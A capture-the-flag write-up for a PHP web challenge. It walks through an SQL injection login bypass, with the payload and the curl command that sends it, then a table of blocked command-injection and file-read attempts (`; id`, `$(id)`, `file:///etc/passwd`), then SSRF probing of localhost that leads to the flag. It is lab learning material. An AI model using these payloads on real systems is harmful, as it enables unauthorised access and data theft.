<img width="582" height="657" alt="image" src="https://github.com/user-attachments/assets/5d5a3d8b-e524-431d-87d1-b824ccd2781f" />

#### **Reconnaissance**

Navigating to the portal, we see a **Login Page** (`/login.php`). 

<img width="580" height="532" alt="image" src="https://github.com/user-attachments/assets/d6606f11-526a-4182-b915-a4808bd7bd6a" />

Upon logging in (using credentials from a previous challenge), we land on the **Dashboard** (`/index.php`):

<img width="1607" height="537" alt="image" src="https://github.com/user-attachments/assets/17e1e0d5-1dc7-4419-81b1-be516376987d" />

The dashboard hints us to the **Network Tools** tab — the real attack surface.

---

#### **Authentication via SQL Injection**

We were told the admin credential from the previous challenge. The login form at `/login.php` is vulnerable to SQL Injection.

**Payload used:**

```
sql

' OR username LIKE '%admin%' OR username LIKE '%root%'-- -
```

**How it works:**

The backend PHP probably runs a query like:

```
sql

SELECT*FROM usersWHERE username='<input>'AND password='<input>'
```

Our injection transforms it into:

```
sql

SELECT*FROM users
WHERE username=''OR usernameLIKE'%admin%'OR usernameLIKE'%root%'-- -'
AND password='anything'
```

- The `- -` comments out the rest (password check)
- The `LIKE '%admin%'` matches any user with "admin" in the username
- Result: We bypass authentication and log in as **Administrator**

**Using `curl.exe` to authenticate and capture the session cookie:**

```
bash

curl.exe-s-c cookies.txt-b cookies.txt-X POST\
"http://<target>/login.php"\
  --data-urlencode"username=' OR username LIKE '%admin%' OR username LIKE '%root%' -- -"\
  --data-urlencode"password=anything"\
-L-o login_response.txt
```

**Session cookie captured:**

```
PHPSESSID=591679c8f52a9124f93d41a4f2747f18
```

We successfully land on the Dashboard as Administrator.

---

#### **Analyzing the Network Tools**

The **Network Tools** page (`/network_tools.php`) presents a single form:

<img width="1497" height="327" alt="image" src="https://github.com/user-attachments/assets/751d4643-f3d6-4c9d-beab-5ba8fa29bc5f" />

Submitting `youtube.com` returns:

```
Response Code: HTTP/1.1 301
```

This tells us the backend executes something like:

```
bash

curl-I<user_input>
```

It runs **`curl -I`** (HTTP HEAD request) and displays only the **status line** of the response.

---

#### **Character Blacklist — Initial Bypass Attempts**

Since the backend passes user input to a shell command, command injection is the obvious vector. We tried:

| **Payload** | **Result** |
| --- | --- |
| `youtube.com; id` | `[!] Warning: Bad characters have been blocked!` |
| `youtube.com | id` |  Blocked |
| `youtube.com && id` | Blocked |
| `youtube.com`id`` | Blocked |
| `youtube.com$(id)` | Blocked |
| `file:///etc/passwd` | Empty response (silently blocked) |
| `php://filter/convert.base64-encode/resource=network_tools.php` | Empty |

The blacklist is aggressive — all common shell metacharacters and the `file://` protocol are blocked or silently suppressed.

---

#### **SSRF Discovery**

Since `curl -I` is being run server-side, we can abuse it for **Server-Side Request Forgery (SSRF)** — making the server send requests to internal resources using standard HTTP URLs (no special characters needed).

We tested internal addresses:

```
bash

# Payload: http://127.0.0.1
curl.exe-s-b"PHPSESSID=$session"-X POST".../network_tools.php"\
-d"url=http%3A%2F%2F127.0.0.1"
```

**Results:**

| **Payload** | **Response** | **Notes** |
| --- | --- | --- |
| `http://127.0.0.1` | `HTTP/1.1 302` | SSRF works! Internal app redirects |
| `http://127.0.0.1:8001` | Empty | Port blocked/filtered |
| `http://127.0.0.1:80/` | `HTTP/1.1 302` | Port 80 is the internal web server |
| `http://127.0.0.1/robots.txt` | `HTTP/1.1 404` | File not found |
| `http://127.0.0.1/Network_Success_Log` | `HTTP/1.1 200` | **FILE EXISTS!** |

**Key finding:** `http://127.0.0.1/Network_Success_Log` returns **HTTP 200 OK** — the log file exists and is being served by the internal web server!

<img width="1485" height="342" alt="image" src="https://github.com/user-attachments/assets/2fa89c6e-0d59-494e-a01d-3d5ffbd5340e" />

---

#### **Identifying the File Location**

Now we know the `Network_Success_Log` file:

1. Exists on the server
2. Is served via HTTP on the internal web server (port 80)
3. Returns a **200 OK** response

Since the internal web server on port 80 shares the **same web root** as the externally accessible port 8001, the file should also be directly accessible from outside!

---

#### **Directly Fetching the Flag**

We attempted to access the log file directly from the external URL:

```
bash

curl.exe-s"http://cbdccf96-bf1b-47d4-8a7d-e04003cafffb.34.143.189.39.sslip.io:8001/Network_Success_Log"
```

**Response:**

```
HNYX{3nD_0f_w4rM_uP_cH4LleNg3_G00dLucK_h4ck3rS!}
```

**Flag captured!**
